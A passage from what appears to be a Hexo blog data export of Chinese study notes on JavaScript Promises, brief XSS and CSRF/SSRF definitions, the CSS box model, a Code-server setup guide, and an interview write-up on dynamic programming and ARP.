class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>块级元素的宽度默认是容器的 100% ，也就是说它的宽度和父元素的宽度一样。<br>里面也可以塞进行内元素和其他块级元素。</p>\n<h3 id=\"行内元素\"><a href=\"#行内元素\" class=\"headerlink\" title=\"行内元素\"></a>行内元素</h3><p>行内元素又名内联元素，一般有下面几种：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">i</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">em</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">strong</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">small</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">del</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>行内元素和相邻行内元素是在同一行上的，而且有个关键的特点——它是不能调宽高的，默认宽高就是内容的宽高。<br>但也不是完全定死，水平方向的 padding 和 margin 就是可调的。<br>行内元素里面只能放纯文本或者其他行内元素，而不能放块级元素。</p>\n<h3 id=\"行内块级元素\"><a href=\"#行内块级元素\" class=\"headerlink\" title=\"行内块级元素\"></a>行内块级元素</h3><p>有这个玩意也是我始料未及的<br>所谓行内块级元素，本质也是行内元素，但不同的是它具有块级元素可调高度的特性，而且和相邻的行内元素在同一行的时候，中间会有空白间隙。<br>行内块级元素一般有下面几种：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">td</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<p>持续更新中…</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li>《JavaScript高级程序设计》（第4版）——Matt Frisbie[著]李松峰[译]</li>\n<li>《从0到1：CTFer成长之路》——Nu1L战队[著]</li>\n<li><a href=\"https://blog.csdn.net/qingyafan/article/details/52203663\">https://blog.csdn.net/qingyafan/article/details/52203663</a></li>\n<li><a href=\"https://www.runoob.com/css/css-boxmodel.html\">https://www.runoob.com/css/css-boxmodel.html</a><br><a href=\"https://blog.csdn.net/qq_34821198/article/details/91359274\">https://blog.csdn.net/qq_34821198/article/details/91359274</a></li>\n</ul>\n","excerpt":"<p>持续懵逼</p>","more":"<h2 id=\"Promise\"><a href=\"#Promise\" class=\"headerlink\" title=\"Promise\"></a>Promise</h2><blockquote>\n<p>所有为你而行的空幻梦想，都不及最后与你许的愿望。——《梦回还》</p>\n</blockquote>\n<h3 id=\"异步编程\"><a href=\"#异步编程\" class=\"headerlink\" title=\"异步编程\"></a>异步编程</h3><p>JS有个很重要的部分叫异步编程，那么所以谓异步，大概可以通过这样一个例子说明：</p>\n<p>一个网页，有文字，有图片，假定按照同步的方式来加载，那么就要等图片下载完了再加载内容，而如此一来，用户看到的就是一个空白了很久的网页突然弹出一堆东西，关键不在突然弹出，而在出现内容前的空白时间，<strong>用户一不耐烦给你关了</strong>，再花的网页都无用了（）。<br>那么就有一个解决方法，先把文字渲染上去，然后等图片传输完成再渲染图片，这样就有一种 99% 的感觉，用户就没那么容易跑了。这就是异步的思想。</p>\n<h3 id=\"回调\"><a href=\"#回调\" class=\"headerlink\" title=\"回调\"></a>回调</h3><p>回调是一种早期的异步编程方式，但是由于其嵌套造成的“回调地狱”，现在基本已经不再使用，就不再赘述了。</p>\n<h3 id=\"期约\"><a href=\"#期约\" class=\"headerlink\" title=\"期约\"></a>期约</h3><p>一个简单的 Promise 实例：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> p=<span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"title function_\">resolve</span>(<span class=\"string\">&#x27;2&#x27;</span>);</span><br><span class=\"line\">    &#125;,<span class=\"number\">2000</span>);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;1&#x27;</span>);</span><br><span class=\"line\">p.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>这段代码中定义了一个 <strong>Promise 对象</strong> p，这个对象中的 setTimeout 会在 2 秒后调用 resolve 方法，resolve 方法一调用， <code>p.then</code> 就会执行，data 接的是 resolve() 传入的参数，这里是 ‘2’ 。</p>\n<h3 id=\"async-await\"><a href=\"#async-await\" class=\"headerlink\" title=\"async/await\"></a>async/await</h3><p>待更新…</p>\n<h2 id=\"xss注入\"><a href=\"#xss注入\" class=\"headerlink\" title=\"xss注入\"></a>xss注入</h2><p>XSS ,也就是 Cross-Site Scripting 的缩写，意为<strong>跨站脚本</strong>。具体来说就是把恶意代码注入到网页中，用户一打开网页，恶意代码就执行了。常见的 XSS 漏洞类型有如下几种：</p>\n<ol>\n<li>反射/存储型 XSS</li>\n<li>DOM 操作型 XSS</li>\n</ol>\n<h3 id=\"反射-存储型-XSS\"><a href=\"#反射-存储型-XSS\" class=\"headerlink\" title=\"反射/存储型 XSS\"></a>反射/存储型 XSS</h3><p>反射型XSS通常是指恶意代码未被服务器存储，每次触发漏洞的时候都将恶意代码通过 GET/POST 方式提交，然后触发漏洞。</p>\n<h2 id=\"csrf-攻击\"><a href=\"#csrf-攻击\" class=\"headerlink\" title=\"csrf 攻击\"></a>csrf 攻击</h2><p>最近打 CTF 见着一个叫 <strong>ssrf</strong> 攻击的，这俩长挺像，就想着是不是一个 Client 一个 Server ，再一搜，发现还真。。。不是。<br>csrf 全称 Cross-site request forgery ，意为<strong>跨站请求伪造</strong>，而 ssrf 全称 Server-side request forgery ，意为<strong>服务器端请求伪造</strong>。</p>\n<h2 id=\"原生-JS-数据绑定和反射\"><a href=\"#原生-JS-数据绑定和反射\" class=\"headerlink\" title=\"原生 JS 数据绑定和反射\"></a>原生 JS 数据绑定和反射</h2><p>待更新…</p>\n<h2 id=\"CSS-盒模型\"><a href=\"#CSS-盒模型\" class=\"headerlink\" title=\"CSS 盒模型\"></a>CSS 盒模型</h2><p>看吧，就是像个盒子（逃<br><img src=\"https://www.runoob.com/images/box-model.gif\" alt=\"盒子图\"><br>（图源菜鸟教程）<br>Margin 指<strong>外边距</strong>，Border 指<strong>边框</strong>，Padding 指<strong>内边距</strong>，Content 指<strong>内容</strong>。<br>然后没啥好解释了，实际上就是反复调整这几个部分的宽高，而且功夫不到家（像我这样）很容易被坑到，因为两个盒子之间可能会存在重叠。</p>\n<h2 id=\"行内元素和块级元素\"><a href=\"#行内元素和块级元素\" class=\"headerlink\" title=\"行内元素和块级元素\"></a>行内元素和块级元素</h2><p>表面上说比较突出的特点就是<strong>块级元素单独占一行或者几行</strong>，而<strong>行内元素不占独立区域</strong>。</p>\n<h3 id=\"块级元素\"><a href=\"#块级元素\" class=\"headerlink\" title=\"块级元素\"></a>块级元素</h3><p>块级元素一般有下面几种：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>~<span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>块级元素的宽度默认是容器的 100% ，也就是说它的宽度和父元素的宽度一样。<br>里面也可以塞进行内元素和其他块级元素。</p>\n<h3 id=\"行内元素\"><a href=\"#行内元素\" class=\"headerlink\" title=\"行内元素\"></a>行内元素</h3><p>行内元素又名内联元素，一般有下面几种：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">i</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">em</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">strong</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">small</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">del</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>行内元素和相邻行内元素是在同一行上的，而且有个关键的特点——它是不能调宽高的，默认宽高就是内容的宽高。<br>但也不是完全定死，水平方向的 padding 和 margin 就是可调的。<br>行内元素里面只能放纯文本或者其他行内元素，而不能放块级元素。</p>\n<h3 id=\"行内块级元素\"><a href=\"#行内块级元素\" class=\"headerlink\" title=\"行内块级元素\"></a>行内块级元素</h3><p>有这个玩意也是我始料未及的<br>所谓行内块级元素，本质也是行内元素，但不同的是它具有块级元素可调高度的特性，而且和相邻的行内元素在同一行的时候，中间会有空白间隙。<br>行内块级元素一般有下面几种：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">td</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<p>持续更新中…</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li>《JavaScript高级程序设计》（第4版）——Matt Frisbie[著]李松峰[译]</li>\n<li>《从0到1：CTFer成长之路》——Nu1L战队[著]</li>\n<li><a href=\"https://blog.csdn.net/qingyafan/article/details/52203663\">https://blog.csdn.net/qingyafan/article/details/52203663</a></li>\n<li><a href=\"https://www.runoob.com/css/css-boxmodel.html\">https://www.runoob.com/css/css-boxmodel.html</a><br><a href=\"https://blog.csdn.net/qq_34821198/article/details/91359274\">https://blog.csdn.net/qq_34821198/article/details/91359274</a></li>\n</ul>"},{"title":"Code-server配置","date":"2022-03-29T16:49:00.000Z","_content":"\n在 Windows 上使用 WSL ，在 WSL 上使用 VSCode ，在 VSCode 上使用 Code-server。\n<!--more-->\n\n> Code-server 感觉不错，免去我远程桌面的麻烦。\n\n## 安装\n\n1. 下载 Code-server\n<https://github.com/coder/code-server/releases/tag/v4.2.0>\n2. 解压 `tar -xvzf code-server.tar.gz`\n3. cd 进解压后的目录，`./code-server /home` `/home` 可以替换成你想要的目录(这步不要在 VSCode 的终端执行)\n\n## 配置\n\n找到 ~/.config/code-server/config.yaml ， `bind-addr` 项可以改你想要的端口，如 `127.0.0.1：8080` ， `password` 项可以改密码。\n然后用 Nginx 代理出去就能在局域网上访问了。\n\n> _ref:_\n<https://www.cnblogs.com/billyme/p/13769847.html>\n<https://blog.csdn.net/mijichui2153/article/details/18880283>\n","source":"_posts/Code-server 配置.md","raw":"---\ntitle: Code-server配置\ndate: 2022-03-30 00:49:00\ntags: [Windows,WSL,VSCode,Code-server]\ncategories: 环境搭建\n---\n\n在 Windows 上使用 WSL ，在 WSL 上使用 VSCode ，在 VSCode 上使用 Code-server。\n<!--more-->\n\n> Code-server 感觉不错，免去我远程桌面的麻烦。\n\n## 安装\n\n1. 下载 Code-server\n<https://github.com/coder/code-server/releases/tag/v4.2.0>\n2. 解压 `tar -xvzf code-server.tar.gz`\n3. cd 进解压后的目录，`./code-server /home` `/home` 可以替换成你想要的目录(这步不要在 VSCode 的终端执行)\n\n## 配置\n\n找到 ~/.config/code-server/config.yaml ， `bind-addr` 项可以改你想要的端口，如 `127.0.0.1：8080` ， `password` 项可以改密码。\n然后用 Nginx 代理出去就能在局域网上访问了。\n\n> _ref:_\n<https://www.cnblogs.com/billyme/p/13769847.html>\n<https://blog.csdn.net/mijichui2153/article/details/18880283>\n","slug":"Code-server 配置","published":1,"updated":"2024-06-05T07:51:23.658Z","_id":"clazajjqz000byo6g9w3ibilt","comments":1,"layout":"post","photos":[],"content":"<p>在 Windows 上使用 WSL ，在 WSL 上使用 VSCode ，在 VSCode 上使用 Code-server。</p>\n<span id=\"more\"></span>\n\n<blockquote>\n<p>Code-server 感觉不错，免去我远程桌面的麻烦。</p>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><ol>\n<li>下载 Code-server<br><a href=\"https://github.com/coder/code-server/releases/tag/v4.2.0\">https://github.com/coder/code-server/releases/tag/v4.2.0</a></li>\n<li>解压 <code>tar -xvzf code-server.tar.gz</code></li>\n<li>cd 进解压后的目录，<code>./code-server /home</code> <code>/home</code> 可以替换成你想要的目录(这步不要在 VSCode 的终端执行)</li>\n</ol>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><p>找到 ~/.config/code-server/config.yaml ， <code>bind-addr</code> 项可以改你想要的端口，如 <code>127.0.0.1：8080</code> ， <code>password</code> 项可以改密码。<br>然后用 Nginx 代理出去就能在局域网上访问了。</p>\n<blockquote>\n<p><em>ref:</em><br><a href=\"https://www.cnblogs.com/billyme/p/13769847.html\">https://www.cnblogs.com/billyme/p/13769847.html</a><br><a href=\"https://blog.csdn.net/mijichui2153/article/details/18880283\">https://blog.csdn.net/mijichui2153/article/details/18880283</a></p>\n</blockquote>\n","excerpt":"<p>在 Windows 上使用 WSL ，在 WSL 上使用 VSCode ，在 VSCode 上使用 Code-server。</p>","more":"<blockquote>\n<p>Code-server 感觉不错，免去我远程桌面的麻烦。</p>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><ol>\n<li>下载 Code-server<br><a href=\"https://github.com/coder/code-server/releases/tag/v4.2.0\">https://github.com/coder/code-server/releases/tag/v4.2.0</a></li>\n<li>解压 <code>tar -xvzf code-server.tar.gz</code></li>\n<li>cd 进解压后的目录，<code>./code-server /home</code> <code>/home</code> 可以替换成你想要的目录(这步不要在 VSCode 的终端执行)</li>\n</ol>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><p>找到 ~/.config/code-server/config.yaml ， <code>bind-addr</code> 项可以改你想要的端口，如 <code>127.0.0.1：8080</code> ， <code>password</code> 项可以改密码。<br>然后用 Nginx 代理出去就能在局域网上访问了。</p>\n<blockquote>\n<p><em>ref:</em><br><a href=\"https://www.cnblogs.com/billyme/p/13769847.html\">https://www.cnblogs.com/billyme/p/13769847.html</a><br><a href=\"https://blog.csdn.net/mijichui2153/article/details/18880283\">https://blog.csdn.net/mijichui2153/article/details/18880283</a></p>\n</blockquote>"},{"title":"Matrix 面试 - 算法&计网篇","date":"2022-04-03T14:12:00.000Z","_content":"\n开局暴击\n<!--more-->\n\n## 算法\n\n面试官给了我一道力扣上的动态规划题，虽然我之前浅浅看过，但没刷过题，一时确实做不出来，然后他换了一道标着“简单”的动规题———经典爬楼梯，still，我还是不会，甚至思路来到了传说中的——递归（逃\n\n直到面试结束后我才一拍脑门，原来递规与动归的区别是**前者从后向前推，而后者从前向后推！**\n\n### 题目\n\n> 假设你正在爬楼梯。需要 n 阶你才能到达楼顶。\n> 每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？\n\n### 分析\n\n不难看出，这题就是求一个**斐波那契数列**，即有\n$$\n    f(n) = f(n-1) + f(n-2)\n$$\n如果用递归，那么就是从 $f(n)$ 开始向前推，显然，这样的复杂度是 $O(2^n)$ 。\n但如果考虑动规，那么就是从 $f(1)$ 开始向后推，不难看出，此时复杂度就神奇般变成了—— $O(n)$ 。\n\n## 计算机网络\n\n> 前段时间由于众所周知的原因，学校把我们平时用的论坛屏蔽了，具体表现在用校园网打不开论坛的网页。后来发现是内网 DNS 搞的鬼，也就兴致勃勃地研究起计算机网络来，上课摸鱼的时候粗略看了一下网络层与网络互连的内容，然后写简历的时候就作死住上填了个“计网初步”，再然后——我就寄了。（安详）——引子\n\n**问**：同一个子网一台主机向另一台主机发送数据，这个数据是否会直接被转发到另一台主机？\n\n七层**网络模型**，从底到顶分别是：物理层，数据链路层，网络层，传输层，会话层，表示层，应用层（现在好像简化成四层来着），总之这个问题大概归到**网络层和数据链路层**的。\n然后呢，答案就是，**我不知道！**\n其实呢，我一开始以为自己知道了，但越看越不知道了，最后可能得把整个计网翻上一遍才能彻底整明白了。（没错这就是传说中的递归学习）\n\n下面简单介绍几个概念，要理解这个问题就逃不开。\n\n1. **物理地址**\n首先有一件事就是，IP 地址是**逻辑网络**上的东西，数据链路层是不能直接用的，就好像你要寄信给小 X 家，地址总不能直接填个“小 X 家”。而详细地址，在计网中叫**物理地址**，才是物理网络所认的标识。\n2. **ARP**\n现在我们有了 IP 地址，就需要用**ARP 协议**(Address Resolution Protocol)来找到对应的物理地址。两者并非是简单的映射关系，而且也会动态变化，就像小 X 搬个家，那里就不叫小 X 家了，过一会搬个小 Y 来，又成了小 Y 家。\n3. **ARP cache**\n为了解决这个问题，主机里就设置了个 **ARP 高速缓存**，即 ARP cache，上面存着本局域网上各主机和路由器的 **IP 地址和物理地址的映射表**。主机 A 向本局域网中的另一台主机 B 发送 IP 数据报时，就先看看里面有没有主机 B 的记录，有的话就好办了，把主机 B 的物理地址写入 MAC 帧里，然后丢进通信链路里就完事。\nBut 事情总不可能这么简单，有相当大的概率表上是没有主机 B 的，这时主机 A 就会在所在局域网上广播一个 **ARP 请求分组**，这个广播可以类似生活中广播的概念，可以做到无差别攻击，就是**局域网上的所有主机**都会收到。这个 ARP 请求分组上有**主机 A 的 IP 地址和物理地址**，也有**主机 B 的 IP 地址**，主机 B ，说这不是我嘛，当即发一个单播回去，很快啊，上面有**主机 B 的 IP 地址和物理地址**。注意到，由于已经收到包含主机 A 物理地址的 ARP 请求分组，所以主机 B 能精准投递到主机 A ，而不用再广播了。显然这时双方都知道对方的物理地址，就写进各自的 ARP cache 中，以后通信就能直接扔过去了。\n至此，问题已经逐渐明朗，但有一个关键点，以上的讨论都是基于同一个**局域网**，而**局域网**和**子网**并无直接联系。\n4. **局域网**\n这个概念非常广泛，一般来讲就是指一个小范围的网络，但这样事情就解释不通了，两台网线都不接的主机放在一起算不算同在一个局域网？说不清。\n所以较真点讲局域网指的是**VLAN**（Virtual LAN），即**虚拟局域网**，虚拟局域网\n\n********************************\n\n待更新...\n\n## 参考\n\n<https://blog.csdn.net/jeffleo/article/details/54174835>\n","source":"_posts/Matrix 面试 - 算法&计网篇.md","raw":"---\ntitle: Matrix 面试 - 算法&计网篇\ndate: 2022-04-03 22:12:00\ntags: [算法,计算机网络]\ncategories: 学习\n---\n\n开局暴击\n<!--more-->\n\n## 算法\n\n面试官给了我一道力扣上的动态规划题，虽然我之前浅浅看过，但没刷过题，一时确实做不出来，然后他换了一道标着“简单”的动规题———经典爬楼梯，still，我还是不会，甚至思路来到了传说中的——递归（逃\n\n直到面试结束后我才一拍脑门，原来递规与动归的区别是**前者从后向前推，而后者从前向后推！**\n\n### 题目\n\n> 假设你正在爬楼梯。需要 n 阶你才能到达楼顶。\n> 每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？\n\n### 分析\n\n不难看出，这题就是求一个**斐波那契数列**，即有\n$$\n    f(n) = f(n-1) + f(n-2)\n$$\n如果用递归，那么就是从 $f(n)$ 开始向前推，显然，这样的复杂度是 $O(2^n)$ 。\n但如果考虑动规，那么就是从 $f(1)$ 开始向后推，不难看出，此时复杂度就神奇般变成了—— $O(n)$ 。\n\n## 计算机网络\n\n> 前段时间由于众所周知的原因，学校把我们平时用的论坛屏蔽了，具体表现在用校园网打不开论坛的网页。后来发现是内网 DNS 搞的鬼，也就兴致勃勃地研究起计算机网络来，上课摸鱼的时候粗略看了一下网络层与网络互连的内容，然后写简历的时候就作死住上填了个“计网初步”，再然后——我就寄了。（安详）——引子\n\n**问**：同一个子网一台主机向另一台主机发送数据，这个数据是否会直接被转发到另一台主机？\n\n七层**网络模型**，从底到顶分别是：物理层，数据链路层，网络层，传输层，会话层，表示层，应用层（现在好像简化成四层来着），总之这个问题大概归到**网络层和数据链路层**的。\n然后呢，答案就是，**我不知道！**\n其实呢，我一开始以为自己知道了，但越看越不知道了，最后可能得把整个计网翻上一遍才能彻底整明白了。（没错这就是传说中的递归学习）\n\n下面简单介绍几个概念，要理解这个问题就逃不开。\n\n1. **物理地址**\n首先有一件事就是，IP 地址是**逻辑网络**上的东西，数据链路层是不能直接用的，就好像你要寄信给小 X 家，地址总不能直接填个“小 X 家”。而详细地址，在计网中叫**物理地址**，才是物理网络所认的标识。\n2. **ARP**\n现在我们有了 IP 地址，就需要用**ARP 协议**(Address Resolution Protocol)来找到对应的物理地址。两者并非是简单的映射关系，而且也会动态变化，就像小 X 搬个家，那里就不叫小 X 家了，过一会搬个小 Y 来，又成了小 Y 家。\n3. **ARP cache**\n为了解决这个问题，主机里就设置了个 **ARP 高速缓存**，即 ARP cache，上面存着本局域网上各主机和路由器的 **IP 地址和物理地址的映射表**。主机 A 向本局域网中的另一台主机 B 发送 IP 数据报时，就先看看里面有没有主机 B 的记录，有的话就好办了，把主机 B 的物理地址写入 MAC 帧里，然后丢进通信链路里就完事。\nBut 事情总不可能这么简单，有相当大的概率表上是没有主机 B 的，这时主机 A 就会在所在局域网上广播一个 **ARP 请求分组**，这个广播可以类似生活中广播的概念，可以做到无差别攻击，就是**局域网上的所有主机**都会收到。这个 ARP 请求分组上有**主机 A 的 IP 地址和物理地址**，也有**主机 B 的 IP 地址**，主机 B ，说这不是我嘛，当即发一个单播回去，很快啊，上面有**主机 B 的 IP 地址和物理地址**。注意到，由于已经收到包含主机 A 物理地址的 ARP 请求分组，所以主机 B 能精准投递到主机 A ，而不用再广播了。显然这时双方都知道对方的物理地址，就写进各自的 ARP cache 中，以后通信就能直接扔过去了。\n至此，问题已经逐渐明朗，但有一个关键点，以上的讨论都是基于同一个**局域网**，而**局域网**和**子网**并无直接联系。\n4. **局域网**\n这个概念非常广泛，一般来讲就是指一个小范围的网络，但这样事情就解释不通了，两台网线都不接的主机放在一起算不算同在一个局域网？说不清。\n所以较真点讲局域网指的是**VLAN**（Virtual LAN），即**虚拟局域网**，虚拟局域网\n\n********************************\n\n待更新...\n\n## 参考\n\n<https://blog.csdn.net/jeffleo/article/details/54174835>\n","slug":"Matrix 面试 - 算法&计网篇","published":1,"updated":"2022-11-27T11:20:01.731Z","_id":"clazajjr0000eyo6g3k6x8c4n","comments":1,"layout":"post","photos":[],"content":"<p>开局暴击</p>\n<span id=\"more\"></span>\n\n<h2 id=\"算法\"><a href=\"#算法\" class=\"headerlink\" title=\"算法\"></a>算法</h2><p>面试官给了我一道力扣上的动态规划题，虽然我之前浅浅看过，但没刷过题，一时确实做不出来，然后他换了一道标着“简单”的动规题———经典爬楼梯，still，我还是不会，甚至思路来到了传说中的——递归（逃</p>\n<p>直到面试结束后我才一拍脑门，原来递规与动归的区别是<strong>前者从后向前推，而后者从前向后推！</strong></p>\n<h3 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h3><blockquote>\n<p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。<br>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>\n</blockquote>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>不难看出，这题就是求一个<strong>斐波那契数列</strong>，即有<br>$$<br>    f(n) = f(n-1) + f(n-2)<br>$$<br>如果用递归，那么就是从 $f(n)$ 开始向前推，显然，这样的复杂度是 $O(2^n)$ 。<br>但如果考虑动规，那么就是从 $f(1)$ 开始向后推，不难看出，此时复杂度就神奇般变成了—— $O(n)$ 。</p>\n<h2 id=\"计算机网络\"><a href=\"#计算机网络\" class=\"headerlink\" title=\"计算机网络\"></a>计算机网络</h2><blockquote>\n<p>前段时间由于众所周知的原因，学校把我们平时用的论坛屏蔽了，具体表现在用校园网打不开论坛的网页。后来发现是内网 DNS 搞的鬼，也就兴致勃勃地研究起计算机网络来，上课摸鱼的时候粗略看了一下网络层与网络互连的内容，然后写简历的时候就作死住上填了个“计网初步”，再然后——我就寄了。（安详）——引子</p>\n</blockquote>\n<p><strong>问</strong>：同一个子网一台主机向另一台主机发送数据，这个数据是否会直接被转发到另一台主机？</p>\n<p>七层<strong>网络模型</strong>，从底到顶分别是：物理层，数据链路层，网络层，传输层，会话层，表示层，应用层（现在好像简化成四层来着），总之这个问题大概归到<strong>网络层和数据链路层</strong>的。<br>然后呢，答案就是，<strong>我不知道！</strong><br>其实呢，我一开始以为自己知道了，但越看越不知道了，最后可能得把整个计网翻上一遍才能彻底整明白了。（没错这就是传说中的递归学习）</p>\n<p>下面简单介绍几个概念，要理解这个问题就逃不开。</p>\n<ol>\n<li><strong>物理地址</strong><br>首先有一件事就是，IP 地址是<strong>逻辑网络</strong>上的东西，数据链路层是不能直接用的，就好像你要寄信给小 X 家，地址总不能直接填个“小 X 家”。而详细地址，在计网中叫<strong>物理地址</strong>，才是物理网络所认的标识。</li>\n<li><strong>ARP</strong><br>现在我们有了 IP 地址，就需要用<strong>ARP 协议</strong>(Address Resolution Protocol)来找到对应的物理地址。两者并非是简单的映射关系，而且也会动态变化，就像小 X 搬个家，那里就不叫小 X 家了，过一会搬个小 Y 来，又成了小 Y 家。</li>\n<li><strong>ARP cache</strong><br>为了解决这个问题，主机里就设置了个 <strong>ARP 高速缓存</strong>，即 ARP cache，上面存着本局域网上各主机和路由器的 <strong>IP 地址和物理地址的映射表</strong>。主机 A 向本局域网中的另一台主机 B 发送 IP 数据报时，就先看看里面有没有主机 B 的记录，有的话就好办了，把主机 B 的物理地址写入 MAC 帧里，然后丢进通信链路里就完事。<br>But 事情总不可能这么简单，有相当大的概率表上是没有主机 B 的，这时主机 A 就会在所在局域网上广播一个 <strong>ARP 请求分组</strong>，这个广播可以类似生活中广播的概念，可以做到无差别攻击，就是<strong>局域网上的所有主机</strong>都会收到。这个 ARP 请求分组上有<strong>主机 A 的 IP 地址和物理地址</strong>，也有<strong>主机 B 的 IP 地址</strong>，主机 B ，说这不是我嘛，当即发一个单播回去，很快啊，上面有<strong>主机 B 的 IP 地址和物理地址</strong>。注意到，由于已经收到包含主机 A 物理地址的 ARP 请求分组，所以主机 B 能精准投递到主机 A ，而不用再广播了。显然这时双方都知道对方的物理地址，就写进各自的 ARP cache 